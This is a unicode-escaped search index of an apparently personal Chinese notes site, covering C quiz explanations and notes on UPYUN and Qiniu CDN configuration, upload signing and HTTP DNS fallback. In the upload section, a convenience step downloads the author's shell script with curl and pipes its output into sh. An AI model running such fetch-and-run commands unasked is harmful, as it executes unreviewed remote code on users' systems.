\u4f60\u53ef\u4ee5\u5728Linux\u4e0a\u4f7f\u7528 gcc -fsanitize=undefined \u7f16\u8bd1\uff0c\u8ba9Undefined Sanitizer\u4e3a\u4f60\u627e\u51fa\u9519\u8bef\uff1b\u987a\u5e26\u4e00\u63d0\uff0cASAN\u4e5f\u5f88\u6709\u7528\uff0c \u53c2\u89c1","title":"\u5c0f\u5fc3\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf"},{"location":"C/#_6","text":"Python\u91cc\u5f88\u7b80\u5355 \u4f60\u53ef\u4ee5os.path.getsize(filename) \u8fd9\u4e2a\u672c\u8d28\u4e0a\u8c03\u7528\u7684\u662fos.stat\uff1b\u4e0b\u9762\u7684\u65b9\u6cd5\u662f\u6253\u5f00\u6587\u4ef6\uff0c\u7528fseek\u8df3\u8f6c\u5230\u6587\u4ef6\u7ed3\u675f Learned from: http://blog.csdn.net/chenglibin1988/article/details/8750480 long int get_file_size(char* filename){ /* * \u4f7f\u7528fseek\u548cftell\u83b7\u53d6\u6587\u4ef6\u5927\u5c0f\uff0c\u5931\u8d25\u65f6\u8fd4\u56de-1 */ int filesize; FILE* fp = fopen(filename,\"rb\"); if( NULL == fp ) return -1; fseek(fp,0,SEEK_END); filesize = ftell(fp); fclose(fp); return filesize; }","title":"\u83b7\u53d6\u6587\u4ef6\u5927\u5c0f"},{"location":"C/#c_1","text":"\u5b66\u4e60\u4e00\u4e0b\u5404\u79cd\u5751\u7239\u7684\u9898\u76ee\u4e5f\u662f\u5f88\u4e0d\u9519\u7684\u561b\uff08\u5176\u5b9e\u6211\u5c31\u662f\u4e3a\u4e86\u628a\u6211\u7684\u89e3\u6790\u53d1\u4e0a\u6765\u3002\u3002\u3002","title":"C\u7a0b\u4e60\u9898\u89e3\u7b54"},{"location":"C/#1","text":"","title":"1.\u7ed3\u6784\u6307\u9488"},{"location":"C/#_7","text":"\u5bf9\u4e8e\u4ee5\u4e0b\u7ed3\u6784\u5b9a\u4e49\uff0cp->str++\u4e2d\u7684++\u52a0\u5728____\u3002 struct {int len; char *str}*p; A.\u6307\u9488str\u4e0a B.\u6307\u9488p\u4e0a C.str\u6307\u5411\u7684\u5185\u5bb9\u4e0a D.\u8bed\u6cd5\u9519\u8bef","title":"\u9898\u76ee"},{"location":"C/#_8","text":"D","title":"\u7b54\u6848"},{"location":"C/#_9","text":"\u4f60\u518d\u4ed4\u7ec6\u770b\u770b\uff1f\u662f\u4e0d\u662f\u5c11\u4e86\u4e2a\u5206\u53f7\uff1f","title":"\u4e00\u53e5\u8bdd\u89e3\u91ca"},{"location":"C/#_10","text":"\u8fd9\u4e2a\u9898\u76ee\u8fd9\u4e48\u5199\u7f16\u8bd1\u5b58\u5728\u8bed\u6cd5\u95ee\u9898\u7684\uff0c\u800c\u4e14\u8fd0\u884c\u4e5f\u4f1a\u70b8 \u4f60\u8bd5\u8bd5\u590d\u5236\u5230Dev C++\u7f16\u8bd1\u770b\u770b\uff1f [ Error ] expected ';' at end of member declaration \u8fd9\u4e2a\u9519\u8bef\u5f88\u663e\u7136\u7684\u561b\uff0c\u7f3a\u5c11\u4e86\u5206\u53f7\uff0c\u6b63\u786e\u5199\u6cd5\uff1a struct {int len; char *str;} *p;","title":"\u8be6\u7ec6\u89e3\u91ca"},{"location":"C/#_11","text":"p\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9\u6307\u9488\u4f7f\u7528->\u8fd0\u7b97\u7b26\u4e4b\u524d\u5fc5\u987b\u8981\u7ed9\u6307\u9488\u4e00\u4e2a\u7a7a\u95f4(\u6b63\u786e\u7684\u503c)\uff0c\u5426\u5219\u5c31\u4f1a\u5bfc\u81f4*null\u800c\u6bb5\u9519\u8bef\u70b8\u6389 \u53e6\u5916 \u8fd9\u4e2astruct\u6ca1\u6709\u540d\u5b57\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u65e0\u6cd5\u7ed9\u4ed6\u8d4b\u503c\uff0c\u4e0d\u80fd\u88ab\u8d4b\u503c\u7684\u6307\u9488\u6709\u4ec0\u4e48\u7528\u5462\uff1f \u6b63\u786e\u7684\u5199\u6cd5\u5982\u4e0b\uff1a #include <stdio.h> #include <stdlib.h> #include <string.h> int main (){ char string [ 666 ] = \"abcd\" ; //\u51c6\u5907\u4e00\u4e2a\u5b57\u7b26\u4e32 struct name { int len ; char * str ;} s ; //\u9996\u5148\u8981\u7ed9struct\u53d6\u4e00\u4e2a\u540d\u5b57name\uff0c\u987a\u5e26\u7528\u8fd9\u4e2a\u540d\u5b57\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8bs s . str = string ; //\u5bf9\u8fd9\u4e2a\u5b9e\u4f8b\u7684str\u8d4b\u503c\u4e3astring\u7684\u5730\u5740 struct name * p = & s ; //\u7136\u540e\u662f\u7528struct name\u6765\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u7ed3\u6784\u7684\u6307\u9488p p -> str ++ ; //\u76f8\u5f53\u4e8es\u7684str++\u4e86\uff0cstr\u539f\u6765\u6307\u5411\"abcd\"\u5b57\u7b26\u4e32\u7684'a'\uff0c\u73b0\u5728\u6307\u5411'b' puts ( p -> str ); //\u8f93\u51fabcd }","title":"\u8fd9\u5c31\u591f\u4e86\u5417\uff1f"},{"location":"C/#_12","text":"struct\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u540d\u5b57 struct\u5927\u62ec\u53f7\u4e2d\u7684\u6bcf\u4e00\u9879\u90fd\u5fc5\u987b \u4ee5\u5206\u53f7\u7ed3\u5c3e \u4f7f\u7528\u6307\u9488\u53d6\u503c \u5982 *p , p->something \u4e4b\u524d\u6307\u9488\u7684\u503c\u5fc5\u987b\u8bbe\u7f6e\u597d \u9047\u5230\u4e0d\u4f1a\u7684\u9898\u76ee\uff0c\u4e3a\u5565\u4e0d\u81ea\u5df1\u95ee\u95ee\u7f16\u8bd1\u5668\u5462\uff1f","title":"\u56de\u987e\u4e00\u4e0b"},{"location":"C/#2","text":"","title":"2.\u7ed3\u6784\u6570\u7ec4"},{"location":"C/#_13","text":"\u5bf9\u4e8e\u4ee5\u4e0b\u7684\u53d8\u91cf\u5b9a\u4e49\uff0c\u8868\u8fbe\u5f0f____\u662f\u6b63\u786e\u7684\u3002 struct node { char s[10]; int k; } p[4]; A. p->k=2 B. p[0].s=\"abc\"; C. p[0]->k=2; D. p->s='a';","title":"\u9898\u76ee"},{"location":"C/#_14","text":"A","title":"\u7b54\u6848"},{"location":"C/#_15","text":"p[0].num \u4e0e (*(p+0)).num \u7b49\u4ef7, \u6240\u4ee5 p[0].num \u4e0e (p+0)->num \u7b49\u4ef7 \u7f16\u8bd1\u4e00\u4e0b\u786e\u5b9eA\u662f\u53ef\u4ee5\u7684 B\u9009\u9879\u9519\u5728\u7ed3\u6784\u4f53\u91cc\u9762\u7684s\u662f\u4e00\u4e2a\u6709\u5185\u5b58\u7a7a\u95f4\u7684char\u6570\u7ec4\uff0c \u4e0d\u80fd\u628a\u6709\u5185\u5b58\u7a7a\u95f4\u7684\u6570\u7ec4\u540d\u79f0\u653e\u5230\u8d4b\u503c\u7684\u7b49\u53f7\u5de6\u8fb9 (\u7f16\u8bd1\u5668\u628a\u6570\u7ec4\u540d\u79f0\u5f53\u6210\u5e38\u91cf\uff0c\u7f16\u8bd1\u5668\u8fd9\u4e48\u8bbe\u8ba1\u7684\u539f\u56e0\u4e5f\u8bb8\u662f\uff1a\u4e0d\u7136\u8fd9\u4e2a\u5185\u5b58\u7a7a\u95f4\u4e0d\u5c31\u5f04\u4e22\u4e86\u561b) \u5b57\u7b26\u4e32\u6b63\u786e\u7684\u201d\u8d4b\u503c\u201d\u64cd\u4f5c\u662f\uff1a strcpy(p[0].s,\"abc\"); C\u9009\u9879 p[0]\u662f\u7ed3\u6784\uff0c\u800c\u4e0d\u662f\u6307\u9488\uff0c\u76f4\u63a5\u5199 p[0].k=2 D\u9009\u9879 \u8fd8\u662f\u76f8\u540c\u7684\u9053\u7406 \u4e0d\u80fd\u628a\u6709\u5185\u5b58\u7a7a\u95f4\u7684\u6570\u7ec4\u540d\u79f0\u653e\u5230\u8d4b\u503c\u7684\u7b49\u53f7\u5de6\u8fb9 \u6b63\u786e\u7684\u5199\u6cd5 p->s[0]='a' , \u4e5f\u53ef\u4ee5\u5199 p[0].s[0]='a'","title":"\u89e3\u6790"},{"location":"C/#_16","text":"\u5982\u679c\u8981\u5199 p[1].s[2]='a' , \u7b49\u4ef7\u7684\u5199\u6cd5\u6709\uff1a (p+1)->s[2]='a'; *((p+1)->s + 2)='a'; *((char*)p+1*sizeof(struct node)+2)='a'; \u6b64\u4ee3\u7801\u4f9b\u4f60\u6d4b\u8bd5\uff1a #include <stdio.h> int main (){ struct node { char s [ 10 ]; int k ; } p [ 4 ]; p [ 1 ]. s [ 2 ] = 'a' ; printf ( \"%c \\n \" , p [ 1 ]. s [ 2 ]); ( p + 1 ) -> s [ 2 ] = 'b' ; printf ( \"%c \\n \" , p [ 1 ]. s [ 2 ]); * (( p + 1 ) -> s + 2 ) = 'c' ; printf ( \"%c \\n \" , p [ 1 ]. s [ 2 ]); * (( char * ) p + 1 * sizeof ( struct node ) + 2 ) = 'd' ; printf ( \"%c\" , p [ 1 ]. s [ 2 ]); return 0 ; }","title":"\u6307\u9488\uff0c\u6570\u7ec4\u5404\u79cd\u73a9\u6cd5"},{"location":"C/#_17","text":"\u9898\u76ee\uff1a \u4ee5\u4e0b\u7a0b\u5e8f\u7684\u8f93\u51fa\u7ed3\u679c\u662f _________________ \u3002 #include <stdio.h> #include <string.h> typedef char ( * AP )[ 5 ]; AP defy ( char * p ) { int i ; for ( i = 0 ; i < 3 ; i ++ ) p [ strlen ( p )] = 'A' ; return ( AP ) p + 1 ; } void main () { char a [] = \"FROG \\0 SEAL \\0 LION \\0 LAMB\" ; puts ( defy ( a )[ 1 ] + 2 ); } \u89e3\u7b54\uff1a \u641e\u6e05\u695a\u6307\u9488\u7684\u7c7b\u578b\u8fd9\u4e2a\u9898\u76ee\u5c31\u5f88\u7b80\u5355\u4e86\uff0c\u53e6\u5916\u8bb0\u4f4f\u8fd9\u4e2a\u516c\u5f0f\uff1a x [ i ] = * ( x + i ) p[strlen(p)] = \u2018A\u2019; \u5c31\u662f\u628a\\0\u7684\u5730\u65b9\u6539\u6210\u4e86\u5b57\u7b26A \u6240\u4ee5\u6211\u4eec\u7684a\u662f\u8fd9\u6837\u5b50\u7684\uff1a \u4ece\u4e00\u7ef4\u6570\u7ec4\u6765\u770ba\u662f FROGASEALALIONALAMB \u4ece5\u5b57\u8282char\u7684\u6570\u7ec4\u7684\u6570\u7ec4\u6765\u770b\u662f \"FROGA\", //\u867d\u7136\u8fd9\u91cc\u5199\u7684\u662f\u5b57\u7b26\u4e32\uff0c\u4f46\u672b\u5c3e\u6ca1\u6709\\0 \"SEALA\", \"LIONA\", \"LAMB\\0\" defy(a)[1]\u5c31\u7b49\u4ef7\u4e8e *(defy(a) +1) \uff0c\u5c31\u662f *( ((AP)a)+1 +1) \uff0c\u5c31\u662f((AP)a)[2] AP\u8fd9\u4e2a\u7c7b\u578b\u662f\u6307\u9488\uff0c\u6307\u5411\u7684\u5143\u7d20\u662f 5\u5b57\u8282\u5927\u5c0f\u7684\u6570\u7ec4\uff0c \u6240\u4ee5((AP)a)[2]\u7684\u7c7b\u578b\u662f char* \uff0c\u6307\u5411\u7684\u662f\u201dLIONA\u201d\u8fd9\u4e2a\u5143\u7d20 \u4f46\u662f\u5f53\u6211\u4eec\u628a\u8fd9\u4e2a\u5143\u7d20\u5f53\u6210 char* \u7528puts\u8f93\u51fa\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u672b\u5c3e\u6ca1\u6709 \\0 \uff0c\u6240\u4ee5\u8981\u7ee7\u7eed\u8f93\u51fa\uff0c\u5c31\u662f\u201dLIONALAMB\u201d \u518d+2\u5c31\u662f\u8981\u8df3\u8fc7\u4e24\u4e2a\u5b57\u8282\uff0c\u5f97\u5230\u7b54\u6848\u201dONALAMB\u201d \u4e3e\u4e00\u53cd\u4e09\uff1a puts(((AP)a)[0])\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u6ca1\u6709\u8c03\u7528defy(a) puts(((AP)a)[0])\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u5df2\u7ecf\u505a\u4e86defy(a) puts(((AP)a)[0]+3)\u8f93\u51fa\u5565\uff1f\u5047\u8bbe\u5df2\u7ecf\u505a\u4e86defy(a) defy(a)[2][1]+1\u662f\u4ec0\u4e48\u7c7b\u578b\uff1f\u503c\u662f\u591a\u5c11\uff1f puts(&defy(a)[2][1])\u8f93\u51fa\u5565\uff1f defy(a)\u4e4b\u540e\u518dputs(&defy(a)[2][1])\u8f93\u51fa\u5565\uff1f \u7b54\u6848\uff1a FROG FROGASEALALIONALAMB GASEALALIONALAMB char\u7c7b\u578b \u2018B\u2019 \u8fd9\u4e2a\u662fchar\u7684\u2019A\u2019\u518d\u52a0\u4e00 AMB \u53d1\u751f\u4e86\u6570\u7ec4\u8d8a\u754c\u8bfb\u5199\uff0c\u8fd9\u662fundefined behaviour","title":"\u6570\u7ec4\u7684\u6570\u7ec4"},{"location":"CDN/","text":"CDN \u00b6 UPYUN \u00b6 \u4e0a\u4f20\u6587\u4ef6\u7684\u65b9\u6cd5 \u00b6 FTP \u00b6 \u4eba\u5bb6\u652f\u6301\u7528ftp\u4f20\u8f93\u6587\u4ef6\uff0c\u800c\u4e14\u7528ftp\u4f3c\u4e4e\u4e0d\u5bf9\u6d41\u91cf\u8ba1\u8d39 ftp://v0.ftp.upyun.com \u7528\u6237\u540d\u662f\u201d\u64cd\u4f5c\u5458\u540d/\u670d\u52a1\u540d\u201d\uff08\u5176\u4e2d/\u5b57\u7b26\u662f\u7528\u6237\u540d\u7684\u4e00\u90e8\u5206\uff09,\u5bc6\u7801\u4e3a\u201d\u64cd\u4f5c\u5458\u5bc6\u7801\u201d \u6709\u4e9b\u65f6\u5019\u4f60\u9700\u8981\u5bf9\u5176\u4e2d\u7684/\u8fdb\u884curlencode\uff0c\u9700\u8981\u7528 %2F \uff08\u4f60\u53ef\u4ee5\u4f7f\u7528Python\u7684 quote(\"/\", \"\") \u6765\u67e5\u8be2\uff09 curlftpfs \u00b6 \u57fa\u4e8e\u4e0a\u8ff0\u7684ftp\uff0c\u5728\u8fd9\u79cd\u60c5\u5883\u4e0b\u53ef\u9760\u6027\u4e0d\u9ad8\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528 http://curlftpfs.sourceforge.net/ \u6ce8\u610f\u547d\u4ee4\u4e2d\u7684 ftp://\u7528\u6237\u540d:\u5bc6\u7801@v0.ftp.upyun.com \u5176\u4e2d\u7684\u7528\u6237\u540d\u7684/\u7b26\u53f7\u9700\u8981\u6539\u4e3a%2f UpyunManager \u00b6 https://github.com/layerssss/manager-for-upyun UPYUN Python\u6267\u884c\u7f13\u5b58\u5237\u65b0 \u00b6 \u6bd4\u5982\u672cblog\u8bbe\u7f6e\u4e86\u7f13\u5b58\u6240\u6709html\u4e00\u5e74\u6765\u51cf\u5c11\u56de\u6e90github\u7684\u6b21\u6570\uff0c\u5728\u6bcf\u6b21\u6211\u66f4\u65b0\u540e\u5c31\u5237\u65b0\u4e00\u6b21\u7f13\u5b58 \u89c4\u5219\u5237\u65b0\uff1a https://github.com/zjuchenyuan/EasyLogin/tree/master/examples/upyun URL\u5237\u65b0\u4e5f\u662f\u540c\u7406\uff1a \u5b98\u65b9\u6587\u6863\uff1ahttp://docs.upyun.com/api/purge/ \u6211\u7684\u4ee3\u7801upyun_purge.py \u6ce8\u610f\u64cd\u4f5c\u5458\u8981\u88ab\u6388\u6743\uff1b\u8c03\u7528API\u6b63\u5e38\u7684\u8fd4\u56de\u503c\u5c31\u662f {'invalid_domain_of_url': {}} \uff0c\u4e0d\u8981\u770b\u5230invalid\u5c31\u4ee5\u4e3a\u51fa\u9519\u4e86hhh \u4f7f\u7528upyun\u63d0\u4f9b\u7684webp\u529f\u80fd\u8282\u7701\u6d41\u91cf \u00b6 \u73b0\u5728\u5df2\u7ecf\u6709\u914d\u7f6e\uff0c\u542f\u7528\u540e\u81ea\u52a8\u6839\u636e\u7528\u6237\u7684\u6d4f\u89c8\u5668Accept\u81ea\u52a8\u8fd4\u56dewebp\uff0c\u65e0\u9700\u4efb\u4f55\u64cd\u4f5c \u4e4b\u524d\u7684\u65b9\u6848\uff1a\u65e0\u9700\u4ee3\u7801\uff0c\u53ea\u9700\u8981\u5728\u539f\u56fe\u540e\u9762\u52a0\u4e0a !/format/webp \u5373\u53ef\uff0c\u5047\u8bbe\u5df2\u7ecf\u5728\u4f7f\u7528\u81ea\u5b9a\u4e49\u56fe\u7247\u683c\u5f0f\uff0c\u4f8b\u5982 !compress \u5219\u53d8\u4e3a !compress/format/webp \u53ef\u4ee5\u8fdb\u4e00\u6b65\u8282\u7701\u6d41\u91cf \u5b98\u65b9\u8bf4\u660e\uff1a https://www.upyun.com/webp.html \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u4fee\u590d\u6539\u7248\u5bfc\u81f4\u7684404\u95ee\u9898 \u00b6 \u672c\u7ad9\u539f\u7248\u4f7f\u7528\u7684Jekyll\u5c06xxx.md\u7f16\u8bd1\u4e3axxx.html\uff0c\u73b0\u5728\u6539\u7528MkDocs\u540exxx.md\u7f16\u8bd1\u5f97\u5230\u7684\u662fxxx/index.html\uff0c\u539f\u5148\u7684\u94fe\u63a5\u5c31404\u4e86 \u53c8\u62cd\u4e91\u80fd\u914d\u7f6e\u8fb9\u7f18\u89c4\u5219 \u8fdb\u884cURL\u6539\u5199\uff0c\u7528\u6237\u5728\u8bbf\u95eexxx.html\u7684\u65f6\u5019\u5b9e\u9645\u56de\u6e90xxx/ \u800c\u4e14\u914d\u7f6e\u633a\u7b80\u5355\uff0c\u53ea\u8981\u4f1a\u5199\u6b63\u5219\u5373\u53ef \u914d\u7f6e\u89c4\u5219\u5982\u4e0b\uff1a \u6761\u4ef6\u5224\u65ad\uff1a \u5982\u679c\u8bf7\u6c42URI \u6b63\u5219\u5339\u914d ^/[^/]*html$ \u529f\u80fd\u9009\u62e9\uff1a URL\u6539\u5199 URI \u5b57\u7b26\u4e32\u63d0\u53d6\uff1a ^/([^/]*).html$ \u6539\u5199\u89c4\u5219\uff1a/$1/ break: \u6253\u52fe UPYUN \u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u5b9e\u73b0upyun TOKEN\u53cd\u76d7\u94fe\u529f\u80fd \u00b6 \u60f3\u53ea\u5bf9\u7279\u5b9aurl\u4f7f\u7528token\u53cd\u76d7\u94fe\uff0c\u4e8e\u662f\u5c31\u4f7f\u7528\u8fb9\u7f18\u89c4\u5219\u6765\u5b9e\u73b0\u4e00\u4e0b\u5b8c\u5168\u517c\u5bb9\u53cd\u76d7\u94fe\u7684\u7b97\u6cd5\u54af \u53d1\u73b0\u4e00\u4e2a\u5751\uff1a\u53c8\u62cd\u4e91\u7684\u8fb9\u7f18\u89c4\u5219\u7684 $SUB \u51fd\u6570 \u5176from\u548cto\u662f\u4ece1\u5f00\u59cb\u8ba1\u6570\u7684\uff0c\u5305\u62ecfrom\uff0c\u4e5f\u5305\u62ecto URI \u5b57\u7b26\u4e32\u63d0\u53d6\u4e0d\u586b\uff0cbreak\u4e0d\u9009\uff0c\u89c4\u5219\u7f16\u8f91\u5668\u586b\u4ee5\u4e0b\u5185\u5bb9 $WHEN($MATCH($_URI, '\u8fd9\u91cc\u586bURI\u5339\u914d\u6b63\u5219'),$OR($GT($_TIME, $SUB($_GET__upt, 9,99)),$NOT($_GET__upt), $NOT($EQ($SUB($MD5('\u8fd9\u91cc\u586bTOKEN''&'$SUB($_GET__upt, 9,99)'&'$_URI),13,20),$SUB($_GET__upt, 1,8)))))$EXIT(403) UPYUN https\u8bc1\u4e66\u66f4\u65b0 \u00b6 \u4f7f\u7528F12\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u770b\u7684\u63a5\u53e3\uff0c\u7528Python\u5b9e\u73b0\u4e86\u4e00\u4e0b\uff0c\u4ece\u624b\u52a8\u4e00\u4e2a\u4e2a\u6dfb\u52a0\u8bc1\u4e66\u4e2d\u89e3\u653e\u51fa\u6765 https://github.com/zjuchenyuan/EasyLogin/tree/master/examples/upyun/ UPYUN \u8868\u5355\u4e0a\u4f20\u600e\u4e48\u7528 \u00b6 \u5728\u529f\u80fd\u914d\u7f6e-\u5b58\u50a8\u7ba1\u7406\u9875\u9762\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\u5bc6\u94a5\uff0c \u5b98\u65b9\u5e2e\u52a9\u6587\u6863 \u8fc7\u4e8e\u5206\u6563\uff0c\u8fd9\u91cc\u6574\u7406\u4e00\u4e0b\u5fc5\u987b\u7684\u6b65\u9aa4 \u9700\u6c42\uff1a\u7b80\u5355\u7684\u5141\u8bb8\u4e0a\u4f20\u4e00\u4e2a\u56fa\u5b9a\u6587\u4ef6\u540d\u7684\u6587\u4ef6\uff0c\u4e0d\u8981\u8fc7\u671f \u9996\u5148\u5199\u4e00\u4e2a\u4e0a\u4f20\u7b56\u7565policy\uff0c\u7136\u540e\u5bf9\u5b83base64\uff0c\u548c\u5bc6\u94a5\u7528&\u62fc\u63a5\u540e\u8ba1\u7b97md5 \u8fd9\u4e2a\u811a\u672c\u5c06\u8f93\u51fa\u53d8\u91cf\u5b9a\u4e49\u548ccurl\u547d\u4ee4\uff0c\u4fbf\u4e8e\u590d\u5236\u4f7f\u7528 key = 'AAA...AAA' bucket = 'demobucket' filename = 'img.jpg' filepath = \"/ ${ filename } \" policy = '{\"bucket\":\"' ${ bucket } '\",\"expiration\":9999999999,\"save-key\":\"' ${ filepath } '\"}' b64_policy = ` echo -n $policy | base64 -w0 ` echo UPYUN_POLICY = ${ b64_policy } echo UPYUN_SIGN = $( echo -n \" ${ b64_policy } & ${ key } \" | md5sum | awk '{print $1}' ) echo \"curl https://v0.api.upyun.com/ ${ bucket } -F file=@ ${ filename } -F policy=\\${UPYUN_POLICY} -F signature=\\${UPYUN_SIGN}\" \u6211\u4e5f\u63d0\u4f9b\u4e86\u4e00\u4e2a\u811a\u672c\u4fbf\u4e8e\u4f60\u5feb\u901f\u8c03\u7528\uff1a curl - O d . py3 . io / up . sh sh up . sh key bucket filename # \u89e6\u53d1\u4e0a\u4f20\u53ea\u8981\u7ee7\u7eed\u4e22\u7ed9 sh\u5c31\u884c sh up . sh key bucket filename | sh UPYUN\u7701\u94b1\u65b9\u6848\uff1a\u7f13\u5b5861\u79d2 \u53d8\u4e3a\u9759\u6001\u8bf7\u6c42 \u00b6 \u867d\u7136\u4eba\u5bb6 \u8ba1\u8d39\u8bf4\u660e \u5199\u7684\u662f \u52a8\u6001\u8bf7\u6c42\u662f\u6307\u56de\u7528\u6237\u6e90\u7ad9\u5e76\u4e14\u7f13\u5b58\u65f6\u95f4\u5c0f\u4e8e 60 \u79d2\u6216\u8005\u6307\u5b9a\u4e0d\u7f13\u5b58\u7684\u8bf7\u6c42\u3002 \u4f46\u4ece\u5b9e\u9645\u7684\u8bbf\u95ee\u65e5\u5fd7\u6765\u770b\uff0c\u7f13\u5b5860\u79d2\u662f\u4e0d\u591f\u7684\uff0c\u5fc5\u987b\u7f13\u5b5861\u79d2\u624d\u5f53\u6210\u9759\u6001\u8bf7\u6c42 \u9700\u8981\u8fdb\u884c\u7684\u4ee3\u7801\u53d8\u52a8: \u5b50\u57df\u540d+\u76f4\u63a5\u89e3\u6790\u5230\u6e90\u7ad9+\u8de8\u57df\u8bf7\u6c42+\u4e00\u4e2a\u83b7\u53d6cookie\u7684\u8def\u7531 \u6ce8\u610f\u5230\u6211\u4eec\u628a\u7f51\u9875\u672c\u8eab\u90fd\u7f13\u5b58\u4e86\uff0c\u6240\u4ee5 \u7f51\u9875\u6e90\u4ee3\u7801\u672c\u8eab\u4e0d\u80fd\u6709\u7528\u6237\u76f8\u5173\u7684\u5185\u5bb9 \u7528\u6237\u767b\u5f55\u72b6\u6001\u53ef\u4ee5\u5b58\u5728cookie\u91cc \u6307\u5b9adomain\u7684\u65b9\u5f0f\u8ba9\u5b50\u57df\u540d\u4e5f\u80fd\u83b7\u53d6 \u7f13\u5b5861\u79d2\uff0c\u4e00\u822c\u7528\u6237\u8fd8\u662f\u80fd\u89e6\u53d1MISS\uff0c\u4ea7\u751f\u4e00\u6b21\u56de\u6e90\u8bbe\u7f6e\u597dcookie \u4f46\u5982\u679c\u7528\u6237\u8bbf\u95ee\u7684\u5168\u90e8\u662f\u7f13\u5b58\u9875\u9762\uff0c\u524d\u7aef\u4ee3\u7801\u9700\u8981\u5148\u5224\u65adcookie\u662f\u5426\u5b58\u5728\uff0c\u4e0d\u5b58\u5728\u5c31\u9700\u8981\u53d1\u8d77getsession\u8bf7\u6c42\u6765\u83b7\u53d6cookie\u518d\u8fdb\u884c\u8de8\u57df\u8bf7\u6c42 \u8fd9\u79cd\u8de8\u57df\u9700\u8981\u5e26\u4e0aCookie\u6240\u4ee5\u662fwithCredential\u7684 \u524d\u7aefjs: function queryme(){ $.ajax({ url:\"https://subdomain.www.example.com/uri\", success:function(data){ //... }, xhrFields:{withCredentials:true} }) } (function(){ if(document.cookie.indexOf(\"user=\")>=0){ queryme(); }else{ $.get(\"/getsession\",null,queryme); } })(); \u540e\u7aefNginx: add_header 'Access-Control-Allow-Origin' 'https://www.example.com'; add_header 'Access-Control-Allow-Credentials' 'true'; Qiniu \u00b6 \u4f7f\u7528qshell\u4e0a\u4f20\u6587\u4ef6\u5939 \u00b6 qshell qupload [ < ThreadCount > ] < LocalUploadConfig > \u9700\u8981\u5199\u4e00\u4e2aconfig\u6587\u4ef6\uff0c\u5177\u4f53\u53c2\u89c1\u5b98\u65b9\u6587\u6863 https://developer.qiniu.com/kodo/tools/1302/qshell https://github.com/qiniu/qshell/wiki/qupload \u672c\u5730DNS\u4e0d\u9760\u8c31\uff1f\u7528HTTP DNS\u8bbf\u95ee\u6b63\u786e\u7684CDN\u8282\u70b9 \u00b6 \u60c5\u5f62\uff1a\u7528\u6237\u7684DNS\u4e0d\u9760\u8c31\uff0c\u4e0d\u9075\u5faaCDN DNS\u7684TTL\u8bbe\u7f6e\uff0c\u5bfc\u81f4\u7528\u6237\u5f97\u5230\u7684\u8282\u70b9IP\u5df2\u7ecf\u8fc7\u671f\u5931\u6548\uff0c\u5bfc\u81f4\u7f51\u7ad9\u4e0a\u7684\u56fe\u7247\u65e0\u6cd5\u52a0\u8f7d \u89e3\u51b3\u65b9\u6848\uff1a\u4f7f\u7528 \u963f\u91cc\u4e91\u7684HTTP DNS (\u652f\u6301HTTPS\u8bf7\u6c42)\uff0c\u7f51\u9875\u7aef\u8bbf\u95ee\u56fe\u7247\u65f6\u5982\u679c\u51fa\u9519\u66ff\u6362\u4e3a \u6307\u5b9aIP\u7684CDN\u8282\u70b9 HTTP DNS\u63a5\u5165 \u00b6 \u6309\u7167\u6587\u6863\u64cd\u4f5c\u5373\u53ef\uff1a https://help.aliyun.com/document_detail/30113.html \u6ce8\u610f\u5230\u76ee\u524d https://203.107.1.33 \u4f1a\u8bc1\u4e66\u9519\u8bef\uff0c\u6539\u7528 https://203.107.1.1 \u5373\u53ef \u8fd9\u4e2a\u63a5\u53e3\u652f\u6301\u8de8\u57df\u8bf7\u6c42\uff1a $. get ( \"https://203.107.1.1/100000/d?host=www.aliyun.com\" , null , function ( data ){ var ip = data . ips [ 0 ]; console . log ( ip ); }); \u6cdb\u57df\u540d\u89e3\u6790 \u00b6 \u53c2\u8003 sslip.io \u5047\u8bbe\u6211\u4eec\u6709\u5df2\u7ecf\u5907\u6848\u7684\u57df\u540d example.com \uff0c\u4f7f\u7528 xip.example.com \u4f5c\u4e3a\u6cdb\u57df\u540d\u89e3\u6790\u7684\u57df\u540d\uff0c\u4e5f\u5c31\u662f\u8bf4 140-205-34-3.xip.example.com \u5c31\u4f1a\u89e3\u6790\u5230 140.205.34.3 \u53ea\u9700\u8981\u8bbe\u7f6e4\u6761NS\u8bb0\u5f55\u5373\u53ef\uff1a ns-aws.nono.io ns-gce.nono.io ns-azure.nono.io ns-vultr.nono.io \u7533\u8bf7\u6cdb\u57df\u540d\u7684https\u8bc1\u4e66 \u00b6 \u53c2\u89c1\uff1a https://py3.io/Nginx/#acmesh \u914d\u7f6eCDN \u00b6 \u5c06\u6cdb\u57df\u540d\u7ed1\u5b9a\u5230CDN\u670d\u52a1\u4e0a\uff0c\u5e76\u63d0\u4f9b\u7533\u8bf7\u5230\u7684HTTPS\u8bc1\u4e66\uff0c\u5f00\u542fHTTPS\u8bbf\u95ee \u524d\u7aefJS \u00b6 \u4e0b\u8ff0\u4ee3\u7801\u51fa\u9519\u65f6\u5c06\u628a\u56fe\u7247src\u7684 www.aliyun.com \u66ff\u6362\u4e3a 1-2-3-4.xip.example.com \uff0c\u7279\u70b9\uff1a \u53ea\u8981\u4e00\u5f20CDN\u7684\u56fe\u7247\u5df2\u7ecf\u51fa\u9519\u5c31\u4f1a\u5f00\u59cb\u66ff\u6362\u6240\u6709\u574f\u56fe \u4e0d\u4f1a\u66ff\u6362\u5df2\u7ecf\u6210\u529f\u52a0\u8f7d\u7684\u56fe\u7247 \u4f7f\u7528localStorage\u7f13\u5b58HTTP DNS\u7684\u67e5\u8be2\u7ed3\u679c \u7f13\u5b58\u4e00\u5468 